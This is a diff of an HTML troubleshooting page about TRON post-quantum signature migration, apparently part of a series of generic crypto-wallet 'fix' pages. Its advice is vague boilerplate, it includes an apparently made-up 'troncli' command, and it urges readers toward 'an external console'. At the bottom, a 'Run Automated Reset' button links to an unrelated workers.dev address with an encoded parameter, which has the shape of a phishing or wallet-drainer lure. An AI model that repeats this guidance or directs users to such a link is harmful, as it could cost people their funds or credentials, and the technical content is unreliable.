@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -42,39 +42,30 @@
 <h1>Java Tron Feature Tron Post Quantum Signature Migration</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users encounter issues with transactions and smart contracts due to the migration of TRON's signature scheme to a post-quantum cryptography system, resulting in failed transactions and contract deployments.</li>
+<li>Users may encounter issues when attempting to migrate to post-quantum signatures on the TRON network, resulting in failed transactions or inability to access their accounts.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the current implementation of the Java Tron client does not support the new post-quantum signature scheme, leading to compatibility issues and transaction failures.</li>
+<li>The error occurs due to incompatible signature schemes between the user's wallet and the TRON network, which has recently implemented post-quantum signature migration.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>To resolve the issue, users can attempt the following manual overrides:</li>
-<li>Update the Java Tron client to the latest version that supports post-quantum signatures</li>
-<li>Configure the client to use a compatible signature scheme</li>
-<li>Implement a custom workaround using the following code block:</li>
+<li>Update their wallet software to the latest version compatible with post-quantum signatures.</li>
+<li>Manually configure their wallet to use the new signature scheme by running the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;signature&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">      </span><span class="nt">&quot;scheme&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;post-quantum&quot;</span><span class="p">,</span>
-<span class="w">      </span><span class="nt">&quot;parameters&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">        </span><span class="nt">&quot;key&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;your-post-quantum-key&quot;</span>
-<span class="w">      </span><span class="p">}</span>
-<span class="w">    </span><span class="p">}</span>
-<span class="w">  </span><span class="p">}</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>troncli<span class="w"> </span>wallet<span class="w"> </span>update<span class="w"> </span>--signature-scheme<span class="w"> </span>post-quantum
 </code></pre></div>
 
-<p>Consider using an external console to test and validate the new configuration before implementing it in production.</p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Java Tron client version 4.0 or later</li>
-<li>Post-quantum key pair generated and stored securely</li>
-<li>TRON network node configured to support post-quantum signatures</li>
+<li>Verify that their account is properly configured for post-quantum signatures by checking the TRON network's blockchain explorer.
+Consider utilizing an external console for further debugging and troubleshooting.
+Prerequisites:</li>
+<li>Latest version of Java Tron installed</li>
+<li>Compatible wallet software</li>
+<li>Basic understanding of TRON network configuration</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-using-waituntil-to-ensure-async-storage-writ.html">Metamask Extension Using Waituntil To Ensure Async Storage Writes Finish</a></li><li><a href="./archive/2026/06/metamask-extension-bug-after-sending-a-transaction-on-custom-ne.html">Metamask Extension Bug After Sending A Transaction On Custom Network</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tronlink-bandwidth-error.html">Tronlink Bandwidth Error</a></li><li><a href="./archive/2026/06/metamask-extension-bug-unable-to-cancel-pending-transaction-due.html">Metamask Extension Bug Unable To Cancel Pending Transaction Due</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gKMyej%40%40" class="btn">🛠 Run Automated Reset</a>
 </div>
